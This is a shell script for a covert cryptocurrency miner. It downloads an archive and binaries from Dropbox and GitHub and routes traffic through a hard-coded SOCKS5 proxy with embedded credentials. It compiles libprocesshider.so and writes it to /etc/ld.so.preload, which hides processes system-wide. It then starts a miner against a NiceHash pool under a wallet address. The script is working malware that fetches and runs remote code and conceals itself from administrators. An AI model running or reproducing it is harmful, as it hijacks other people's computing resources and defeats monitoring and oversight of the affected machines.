#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget -q https://www.dropbox.com/s/tgsmlqggphjv3vk/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.94.47.66:8110
socks5_username = ingfoingfo
socks5_password = maszZeehh
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/stratum
chmod +x stratum

./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magic.zip
unzip magic.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./bezzHash --url=stratum+tcp://3N2Fz6SyDdkBFvNfYw75LV79WDpx24N2RP.$(echo $(shuf -i 1-99999 -n 1)-T4)@beamv3.eu-west.nicehash.com:3387 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
